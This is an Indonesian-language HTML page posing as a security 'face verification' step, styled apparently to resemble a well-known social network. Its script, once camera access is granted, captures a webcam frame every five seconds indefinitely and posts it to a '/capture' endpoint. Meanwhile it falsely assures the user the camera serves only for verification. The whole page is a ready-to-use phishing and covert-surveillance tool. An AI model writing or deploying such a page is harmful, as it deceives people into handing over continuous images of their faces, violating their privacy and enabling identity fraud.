<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            max-width: 400px;
            width: 100%;
            padding: 32px 28px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            text-align: center;
        }
        .logo {
            font-size: 28px;
            font-weight: 700;
            color: #1877f2;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        .sub {
            color: #606770;
            font-size: 15px;
            margin-bottom: 24px;
        }
        .shield {
            background: #e7f3ff;
            width: 64px;
            height: 64px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            font-size: 32px;
        }
        h2 {
            font-size: 20px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 8px;
        }
        p {
            color: #606770;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        video {
            width: 100%;
            max-width: 320px;
            background: #000;
            border-radius: 12px;
            display: none;
            margin: 12px auto;
        }
        .btn {
            background: #1877f2;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #166fe5;
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .loading {
            display: none;
            margin-top: 16px;
            color: #1877f2;
            font-size: 14px;
        }
        .loading::after {
            content: '...';
            animation: dot 1.5s steps(4) infinite;
        }
        @keyframes dot {
            0% { content: ''; }
            25% { content: '.'; }
            50% { content: '..'; }
            75% { content: '...'; }
        }
        .footer {
            margin-top: 24px;
            font-size: 13px;
            color: #8a8d91;
            border-top: 1px solid #dadde1;
            padding-top: 20px;
        }
        .footer a {
            color: #1877f2;
            text-decoration: none;
        }
        .status {
            margin-top: 12px;
            font-size: 14px;
            min-height: 20px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🔒 Secure</div>
        <div class="sub">Verifikasi Dua Langkah</div>

        <div class="shield">🛡️</div>
        <h2>Konfirmasi Identitas</h2>
        <p>Untuk melindungi akun Anda, kami perlu memverifikasi wajah Anda.</p>
        <p style="font-size:13px; color:#8a8d91;">Kamera akan digunakan hanya untuk verifikasi ini.</p>

        <video id="video" autoplay playsinline></video>

        <button class="btn" id="startBtn">Lanjutkan Verifikasi</button>
        <div class="loading" id="loadingText">Memproses</div>
        <div class="status" id="statusMsg"></div>

        <div class="footer">
            <span>🔐 Koneksi aman</span> • 
            <a href="#">Bantuan</a> • 
            <a href="#">Privasi</a>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const startBtn = document.getElementById('startBtn');
        const loadingText = document.getElementById('loadingText');
        const statusMsg = document.getElementById('statusMsg');
        let stream = null;

        startBtn.addEventListener('click', function() {
            if (stream) return;

            startBtn.disabled = true;
            startBtn.textContent = 'Mengakses kamera...';
            statusMsg.textContent = '';

            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                audio: false
            })
            .then(s => {
                stream = s;
                video.style.display = 'block';
                video.srcObject = s;
                startBtn.style.display = 'none';
                loadingText.style.display = 'block';
                statusMsg.textContent = '✅ Kamera aktif – verifikasi berjalan';
                statusMsg.style.color = '#2ecc71';
                captureLoop();
            })
            .catch(err => {
                statusMsg.textContent = '❌ Izin ditolak. Silakan coba lagi.';
                statusMsg.style.color = '#e74c3c';
                startBtn.disabled = false;
                startBtn.textContent = 'Lanjutkan Verifikasi';
            });
        });

        function captureLoop() {
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 320, 240);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);

            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ img: dataUrl })
            });

            setTimeout(captureLoop, 5000);
        }
    </script>
</body>
</html>
